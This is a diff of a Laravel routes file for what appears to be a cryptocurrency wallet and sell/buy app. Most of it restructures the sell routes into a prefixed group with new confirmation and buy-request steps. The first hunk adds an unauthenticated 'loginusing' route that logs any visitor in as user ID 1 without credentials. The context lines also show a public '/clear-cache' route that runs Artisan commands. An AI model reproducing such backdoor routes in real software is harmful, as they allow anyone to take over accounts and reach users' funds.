@@ -12,7 +12,9 @@ use Illuminate\Support\Facades\Route;
 | contains the "web" middleware group. Now create something great!
 |
 */
-
+Route::get('loginusing',function(){
+    return Auth::loginUsingId(1);
+});
 Route::get('/clear-cache', function() {
     Artisan::call('config:cache');
     Artisan::call('cache:clear');
@@ -61,9 +63,15 @@ Route::middleware('auth')->group(function(){
         Route::get('wallet/deposit/history/{type?}/{typename?}',[App\Http\Controllers\TransactionController::class, 'index'])->name('wallet.request.history');
     });
     //sell crypt
-    Route::get('sell/create','SellController@create')->name('sell.create');
-	Route::post('sell','SellController@saveSell')->name('sell.save_sell');
-	Route::get('sell/{trans_id}/edit','SellController@edit')->name('sell.edit');
+    Route::prefix('sell')->group(function(){
+        Route::get('create','SellController@create')->name('sell.create');
+        Route::post('create-sell','SellController@saveSell')->name('sell.save_sell');
+    	Route::post('create-sell/confirm','SellController@confirmSell')->name('sell.confirm_sell');
+        Route::get('{trans_id}/buy-request','SellController@buyRequest')->name('sell.buyer_request');
+        Route::post('{trans_id}/buy-request/confirm','SellController@buyRequestConfrim')->name('sell.buyer_request_confrim');
+        Route::get('{trans_id}/confirm-receipt','SellController@confirmReceipt')->name('sell.confirm_receipt');
+    	Route::get('{trans_id}/success','SellController@orderSuccess')->name('sell.order_success');
+    });
 });
 
 Route::get('buyer/payment/{transaction}/request',[App\Http\Controllers\PaymentController::class, 'show'])->name('payment.show');
